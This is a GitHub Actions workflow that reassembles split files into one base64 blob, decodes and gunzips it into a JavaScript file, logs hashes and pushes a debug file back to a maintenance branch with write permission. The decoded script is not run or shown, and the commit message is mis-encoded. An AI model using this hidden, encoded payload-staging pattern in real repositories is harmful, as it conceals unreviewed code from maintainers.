name: Run catalog maintenance 2026-07-21

on:
  pull_request:
    branches:
      - main
  workflow_dispatch:

permissions:
  contents: write
  pull-requests: read

concurrency:
  group: catalog-maintenance-2026-07-21
  cancel-in-progress: true

jobs:
  maintain:
    name: Diagnose maintenance payload
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Checkout maintenance branch
        uses: actions/checkout@v6
        with:
          ref: codex/2026-07-21-catalog-maintenance
          fetch-depth: 0
          show-progress: false

      - name: Record payload diagnostics
        shell: bash
        run: |
          set +e
          {
            echo "generated_at=$(date -u +%FT%TZ)"
            for file in .github/maintenance/2026-07-21-script.part*; do
              printf "%s bytes=" "$file"
              wc -c < "$file" | tr -d ' '
              sha256sum "$file"
            done
            cat .github/maintenance/2026-07-21-script.part* > /tmp/catalog-maintenance.js.gz.b64
            echo "combined:"
            wc -c /tmp/catalog-maintenance.js.gz.b64
            sha256sum /tmp/catalog-maintenance.js.gz.b64
            echo "decode:"
            base64 -d /tmp/catalog-maintenance.js.gz.b64 | gzip -d > /tmp/catalog-maintenance.js
            echo "decode_status=$?"
            wc -c /tmp/catalog-maintenance.js
            sha256sum /tmp/catalog-maintenance.js
          } > catalog-maintenance-debug.txt 2>&1
          cat catalog-maintenance-debug.txt
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add catalog-maintenance-debug.txt
          git commit -m "иЁҳйҢ„з¶ӯиӯ·и…іжң¬иЁәж–·иіҮиЁҠ"
          git push origin HEAD:codex/2026-07-21-catalog-maintenance
